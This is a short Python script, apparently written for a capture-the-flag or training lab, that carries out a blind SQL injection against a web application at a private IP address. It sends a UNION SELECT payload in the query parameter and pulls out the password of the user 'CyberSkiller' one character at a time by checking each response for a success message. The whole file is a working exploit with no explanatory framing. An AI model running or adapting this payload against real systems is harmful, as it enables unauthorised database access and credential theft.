import requests

from string import ascii_uppercase

URL = 'http://10.36.30.146/?query=dasdasdsa%22+UNION+SELECT+password+FROM+users+WHERE+username%3D%27CyberSkiller%27+AND+password+LIKE+%27C{}%25%27+--+a'

positive = 'This title (or similar) does exist in our database'

password = ''

for c in ascii_uppercase:
	print('prubuje: ' + c)
	r = requests.get(URL.format(c))
	if positive in r.text:
		password += c
		print('Haslo: ' + password)
		break


for k in range(10):
	for i in range(10):
		print('prubuje: ' + str(k)+ " "+ str(i))
		r = requests.get(URL.format(password + str(i)))
		if positive in r.text:
			password += "" + str(i)
			print('Haslo: ' + password)
			break

print('ostateczne haslo: ' + password)